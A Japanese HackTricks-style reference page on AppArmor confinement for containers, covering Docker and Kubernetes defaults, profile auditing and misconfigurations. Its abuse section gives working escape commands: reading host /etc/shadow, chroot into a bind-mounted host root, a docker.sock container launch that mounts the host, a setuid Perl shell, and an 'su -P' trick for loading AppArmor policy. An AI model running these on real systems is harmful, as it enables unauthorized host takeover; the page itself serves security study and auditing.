# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmor は、プログラムごとのプロファイルを通じて制限を適用する**強制アクセス制御**システムです。ユーザーやグループの所有権に大きく依存する従来の DAC チェックとは異なり、AppArmor ではプロセス自体に適用されるポリシーをカーネルが強制できます。コンテナ環境では、ワークロードに従来の権限が十分にあって操作を試みられる場合でも、AppArmor プロファイルが該当するパス、マウント、ネットワーク動作、またはケイパビリティの使用を許可しなければ拒否されるため、重要です。

最も重要な概念は、AppArmor が**パスベース**であることです。SELinux のようにラベルを使うのではなく、パスルールを通じてファイルシステムへのアクセスを判断します。これは理解しやすく強力ですが、バインドマウントや異なるパス構成には慎重な注意が必要です。同じホストコンテンツに別のパスからアクセスできる場合、ポリシーの効果が運用者の当初の想定と異なることがあります。

## コンテナ分離における役割

コンテナのセキュリティレビューでは、ケイパビリティと seccomp の確認で終わることがよくありますが、それらの確認後も AppArmor は重要です。必要以上の権限を持つコンテナや、運用上の理由で追加のケイパビリティが必要なワークロードを想像してください。AppArmor は、ファイルアクセス、マウント動作、ネットワーク、実行パターンを引き続き制限でき、明白な悪用経路を阻止できます。そのため、「アプリケーションを動かすためだけに」AppArmor を無効にすると、リスクのあるだけだった設定が、気づかないうちに実際に悪用可能な設定へと変わることがあります。

## ラボ

ホストで AppArmor が有効かどうかを確認するには、次を実行します。

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

現在のコンテナプロセスがどの環境下で実行されているかを確認するには:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

通常のケースでは、プロセスにランタイムが選択したプロファイルに紐づく AppArmor コンテキストが表示されるはずです。unconfined のケースでは、この追加の制限レイヤーがなくなります。

Docker が適用したと認識している内容も確認できます。

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Runtime Usage

Docker は、ホストがサポートしている場合、デフォルトまたはカスタムの AppArmor プロファイルを適用できます。Podman も AppArmor ベースのシステムでは AppArmor と統合できますが、SELinux を優先するディストリビューションでは、もう一方の MAC システムが中心となることがよくあります。Kubernetes は、実際に AppArmor をサポートするノード上で、ワークロードレベルの AppArmor ポリシーを適用できます。LXC や、Ubuntu 系の関連するシステムコンテナ環境でも AppArmor が広く使われています。

重要なのは、AppArmor は「Docker の機能」ではないということです。これはホストカーネルの機能であり、複数のランタイムが適用を選択できます。ホストが AppArmor をサポートしていない場合や、ランタイムが unconfined で実行するよう指定されている場合、想定される保護は実際には機能しません。

Kubernetes では、現在の API は `securityContext.appArmorProfile` です。Kubernetes `v1.30` 以降、古い beta AppArmor annotations は非推奨です。サポート対象のホストでは、`RuntimeDefault` がデフォルトプロファイルで、`Localhost` はノードですでに読み込まれている必要があるプロファイルを指します。これはレビュー時に重要です。マニフェストが AppArmor に対応しているように見えても、実際にはノード側のサポートと、事前に読み込まれたプロファイルに全面的に依存している場合があるためです。<sup>[[1]](#references)</sup>

運用上、見落としやすいものの有用な点として、`appArmorProfile.type: RuntimeDefault` を明示的に設定する方が、単にフィールドを省略するより厳格です。フィールドが明示的に設定されていて、ノードが AppArmor をサポートしていない場合、admission は失敗するはずです。フィールドを省略すると、AppArmor のないノードでもワークロードが実行され、追加の隔離レイヤーが適用されない可能性があります。攻撃者の視点では、マニフェストと実際のノード状態の両方を確認すべき理由になります。<sup>[[1]](#references)</sup>

AppArmor 対応の Docker ホストで最もよく知られているデフォルトプロファイルは `docker-default` です。このプロファイルは Moby の AppArmor template から生成されており、一部の capability ベースの PoC がデフォルトのコンテナで失敗する理由を説明するうえで重要です。大まかに言うと、`docker-default` は通常のネットワーク通信を許可し、`/proc` の多くの領域への書き込みを拒否し、`/sys` の機密領域へのアクセスを拒否し、mount 操作をブロックし、ptrace を制限して、ホストを調査する汎用的な手段として使えないようにします。この基準を理解しておくと、「コンテナに `CAP_SYS_ADMIN` がある」ことと、「関心のあるカーネルインターフェースに対して、その capability を実際に使える」ことを区別できます。

## Profile Management

AppArmor プロファイルは通常、`/etc/apparmor.d/` 以下に保存されます。一般的な命名規則では、実行ファイルのパスに含まれるスラッシュをドットに置き換えます。たとえば、`/usr/bin/man` のプロファイルは、一般に `/etc/apparmor.d/usr.bin.man` として保存されます。この点は防御と評価のどちらにおいても重要です。有効なプロファイル名が分かれば、ホスト上で対応するファイルをすぐに見つけられることが多いためです。

ホスト側で役立つ管理コマンドには、次のものがあります。

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

コンテナセキュリティのリファレンスでこれらのコマンドが重要なのは、プロファイルの実際の作成、読み込み、complain mode への切り替え、アプリケーション変更後の修正方法を説明しているためです。トラブルシューティング中にプロファイルを complain mode に切り替えたまま、enforcement に戻すのを忘れる習慣があると、ドキュメント上ではコンテナが保護されているように見えても、実際にははるかに緩い動作をしている可能性があります。

### プロファイルの作成と更新

`aa-genprof` はアプリケーションの動作を監視し、対話形式でプロファイルを生成するのに役立ちます。

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` は、後で `apparmor_parser` で読み込めるテンプレートプロファイルを生成できます。

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

バイナリが変更され、ポリシーの更新が必要になった場合、`aa-logprof` はログ内で見つかった拒否を再生し、許可するか拒否するかの判断をオペレーターに支援します:

```bash
sudo aa-logprof
```

### ログ

AppArmor による拒否は、`auditd`、syslog、または `aa-notify` などのツールで確認できることがよくあります。

```bash
sudo aa-notify -s 1 -v
```

これは運用面でも攻撃面でも役立ちます。防御側はこれを使ってプロファイルを改善します。攻撃者は、どのパスや操作が拒否されているのか、また AppArmor がエクスプロイトチェーンを阻止している制御なのかを正確に把握するために使います。

### プロファイルファイルの特定

ランタイムにコンテナの特定の AppArmor プロファイル名が表示される場合、その名前をディスク上のプロファイルファイルに対応付けると役立つことがよくあります。

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

これは特にホスト側でレビューする際に有用です。「コンテナは `lowpriv` プロファイルで実行中だと示している」状態と、「実際のルールは監査または再読み込みできるこの特定のファイルにある」状態の隔たりを埋められます。

### 監査すべき重要なルール

プロファイルを読める場合は、単純な `deny` 行だけで終わらせないでください。いくつかのルールタイプは、コンテナエスケープの試みに対する AppArmor の有効性を大きく左右します:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: 対象のバイナリを非制限で実行します。到達可能なヘルパー、シェル、またはインタープリターが `ux` で許可されている場合、通常はまずこれをテストします。
- `px` / `Px` および `cx` / `Cx`: exec 時にプロファイルを遷移します。これらは自動的に問題となるわけではありませんが、遷移先が現在のプロファイルより大幅に制限の緩いプロファイルである可能性があるため、監査する価値があります。
- `change_profile`: タスクが別のロード済みプロファイルに即時、または次回の exec 時に切り替わることを許可します。遷移先のプロファイルが弱ければ、制限の厳しいドメインから抜け出すための意図的な抜け道になる可能性があります。
- `flags=(complain)`、`flags=(unconfined)`、または新しい `flags=(prompt)`: これらは、プロファイルをどの程度信頼するかを左右します。`complain` は拒否を強制せずにログに記録し、`unconfined` は境界を取り除き、`prompt` はカーネルによる拒否だけでなく、userspace の判断経路に依存します。
- `userns` または `userns create,`: 新しい AppArmor ポリシーは、user namespace の作成を制御できます。コンテナプロファイルが明示的にこれを許可している場合、プラットフォームが強化策の一環として AppArmor を使用していても、入れ子の user namespace は引き続き利用できます。

ホスト側での便利な grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

この種の監査は、何百もの一般的なファイルルールを眺めるよりも役立つことがよくあります。breakout がヘルパーの実行、新しい namespace への移行、またはより制限の緩いプロファイルへの脱出に依存している場合、その答えは明白な `deny /etc/shadow r` のような行ではなく、こうした移行に関するルールに隠れていることがよくあります。

## 設定ミス

最も明白な間違いは `apparmor=unconfined` です。管理者は、プロファイルが危険または想定外の操作を正しくブロックしたためにアプリケーションが失敗した際、デバッグ中にこの設定を行うことがよくあります。本番環境でもこのフラグが有効なままだと、MAC レイヤー全体が実質的に無効化されます。

もう一つの微妙な問題は、ファイルの権限が通常どおりに見えるため、bind mount は無害だと思い込むことです。AppArmor はパスベースなので、別のマウント位置にホストパスを公開すると、パスルールとの間で問題が生じることがあります。3つ目の間違いは、設定ファイル内のプロファイル名は、ホストカーネルが実際に AppArmor を強制していなければほとんど意味がないことを忘れることです。

## 悪用

AppArmor がなくなると、これまで制限されていた操作が突然成功する場合があります。たとえば、bind mount 経由で機密性の高いパスを読み取る、本来よりアクセスしにくいはずの procfs や sysfs の一部にアクセスする、capability と seccomp も許可していればマウント関連の操作を実行する、あるいは通常ならプロファイルによって拒否されるパスを使う、といった操作です。capability ベースの breakout の試みが、理論上は「成功するはず」なのに実際には失敗する理由を説明する仕組みとして、AppArmor が関わっていることはよくあります。AppArmor を取り除けば、同じ試みが成功し始める可能性があります。

path traversal、bind mount、またはマウントを利用した悪用チェーンを AppArmor が主に阻止していると疑われる場合、通常はまず、プロファイルの有無によって何がアクセス可能になるかを比較します。たとえば、ホストパスがコンテナ内にマウントされている場合は、まずそこをたどって読み取れるか確認します。

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

コンテナに `CAP_SYS_ADMIN` のような危険な capability もある場合、最も実用的なテストの1つは、mount 操作や機密性の高い kernel filesystem へのアクセスをブロックしている制御が AppArmor かどうかを確認することです：

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

ホストパスが bind mount 経由ですでに利用可能な環境では、AppArmor の保護が失われることで、読み取り専用の情報漏えい問題がホストファイルへの直接アクセスに変わる可能性もあります：

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

これらのコマンドの要点は、AppArmorだけでbreakoutが起きるということではありません。AppArmorが解除されると、多くのfilesystemやmountを利用した悪用経路をすぐに試せるようになるということです。

### 完全な例: AppArmor無効化 + Host Rootのマウント

コンテナにすでにホストのrootが`/host`へbind-mountされている場合、AppArmorを解除すると、ブロックされていたfilesystemの悪用経路が完全なhost escapeにつながる可能性があります:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

shell が host filesystem 経由で実行されると、workload は実質的に container の境界を脱出したことになります:

```bash
id
hostname
cat /etc/shadow | head
```

### 完全な例: AppArmor 無効化 + Runtime Socket

実際の障壁がランタイム状態を保護する AppArmor だった場合、マウントされたソケットだけで完全なエスケープが可能です:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

正確なパスはマウントポイントによって異なりますが、結果は同じです。AppArmorはランタイムAPIへのアクセスを防げなくなり、ランタイムAPIからホストを侵害するコンテナを起動できます。

### 完全な例: パスベースのbind mountバイパス

AppArmorはパスベースであるため、`/proc/**`を保護しても、別のパス経由でアクセスできる同じホストのprocfsコンテンツが自動的に保護されるわけではありません。

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

影響は、何がマウントされているか、また別のパスが他の制御も回避するかによって異なりますが、このパターンは、AppArmorを単独で評価するのではなく、マウント構成と併せて評価しなければならない最も明確な理由の一つです。

### 完全な例: Shebang Bypass

AppArmorは、shebangで指定されたインタープリターのパスではなく、実行されたスクリプトのパスにprofileを適用することがあります。逆に、インタープリターを直接呼び出すと、そのインタープリターのprofileが選択されることがあります。[AppArmorのメンテナーがこの違いを説明しています](https://bugs.launchpad.net/apparmor/+bug/1911431)。過去の例では、1行目で制限されたインタープリターを指定するスクリプトが関係していました。

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

この例は、interpreter の file capability が有効になり得て、かつスクリプトの実際の exec attachment がその操作を許可する場合に限った候補です。読み込まれている policy と process label、capability bounding set、`no_new_privs`、mount の `nosuid` 状態を確認してください。profile のファイル名や `cap_setuid+ep` の表示だけでは、利用可能な遷移があることの証明にはなりません。interpreter chain と別の実行経路は、個別に確認してください。

## Policy-control files as a privileged write primitive

影響を受ける AppArmor kernel では、unprivileged user が securityfs の `.load`、`.replace`、`.remove` ファイルを書き込み用に開けますが、policy-admin 権限は書き込み時に確認されるため、直接 `write()` しても失敗します。setuid helper がその descriptor を stdout または stderr として引き継ぎ、攻撃者が制御する bytes を書き込むと、kernel は helper の credentials を認識します。つまり、この helper は policy data の *privileged writer* となるのであり、呼び出し元に root 権限を一般的に付与するものではありません。Qualys は、`su -P` が特権 PTY 経路を通じて、同じ user として実行した command の bytes を中継できることを実証しました。この経路を利用するには、user の account に password が設定されている必要があります。world-writable な file mode を脆弱性の証拠とみなさず、インストール済みの kernel と `su` の修正状況を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>

影響を受ける kernel と helper を使った使い捨ての lab では、以下の操作でテスト用 profile を作成し、その後削除します。shell は `su` が書き込む前に各 control file を開きます。`stty raw` により、PTY の中継でコンパイル済み profile の bytes が変更されないようにします。本番環境の profile に対してこのテストを実行しないでください。<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

同じ primitive で既存の profile を置き換えることもできます。たとえば、launcher に `userns` を許可する profile によって AppArmor の user namespace 制限を解除できる場合がありますが、ホストの root 権限が付与されるわけではありません。実際には namespace の sysctl やその他の制御も引き続き重要です。また、対象プロセスの confinement を解除することもできます。より広範な権限昇格の手順については、[kernel exposure checks](../../../main-system-information/kernel-vulnerability-assessment.md) と [Linux Hardening の概要](../../../) を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>

## Checks

これらのチェックでは、次の3つの質問に素早く答えることを目指します。ホストで AppArmor が有効か、現在のプロセスが confinement されているか、そして runtime が実際にこの container に profile を適用したか、です。

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

ここで注目すべき点：

- `/proc/self/attr/current` に `unconfined` と表示される場合、ワークロードは AppArmor による制限の恩恵を受けていません。
- `aa-status` で AppArmor が無効または未ロードと表示される場合、ランタイム設定にあるプロファイル名は、ほぼ見かけだけのものです。
- `docker inspect` に `unconfined` または想定外のカスタムプロファイルが表示される場合、ファイルシステムやマウントを利用した攻撃経路が機能する原因になっていることがよくあります。
- `/sys/kernel/security/apparmor/profiles` に想定したプロファイルが含まれていない場合、ランタイムやオーケストレーターの設定だけでは不十分です。
- 強化されたはずのプロファイルに `ux`、広範な `change_profile`、`userns`、または `flags=(complain)` のようなルールが含まれている場合、実際の境界はプロファイル名から想像されるよりもかなり弱い可能性があります。

運用上の理由でコンテナにすでに高い権限が付与されている場合でも、AppArmor を有効にしておくことで、制御された例外で済むか、はるかに広範なセキュリティ障害につながるかが変わることがよくあります。

## ランタイムのデフォルト設定

| ランタイム / プラットフォーム | デフォルトの状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | 上書きされない限り、`docker-default` AppArmor プロファイルを使用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | ホストに依存 | `--security-opt` による AppArmor をサポートしていますが、正確なデフォルトはホストやランタイムに依存し、Docker の文書化された `docker-default` プロファイルほど一律ではありません | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 条件付きのデフォルト | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` ですが、ノードで AppArmor が有効な場合にのみ適用されます | `securityContext.appArmorProfile.type: Unconfined`、弱いプロファイルを指定した `securityContext.appArmorProfile.type: Localhost`、AppArmor をサポートしないノード |
| Kubernetes 上の containerd / CRI-O | ノード / ランタイムのサポートに従う | Kubernetes がサポートする一般的なランタイムは AppArmor をサポートしていますが、実際に適用されるかはノードのサポートとワークロードの設定に依存します | Kubernetes の行と同じ。ランタイムを直接設定して AppArmor を完全にスキップすることも可能です |

AppArmor で最も重要な要因は、ランタイムだけでなく、**ホスト**であることがよくあります。マニフェストでプロファイルを設定しても、AppArmor が有効でないノードでは制限は適用されません。



## References

- [1] [Kubernetes のセキュリティコンテキスト：AppArmor プロファイルのフィールドとノードサポートの動作](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage：exec 遷移、`change_profile`、`userns`、プロファイルフラグ](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys CrackArmor の技術アドバイザリ](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu CrackArmor 脆弱性ナレッジベース](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
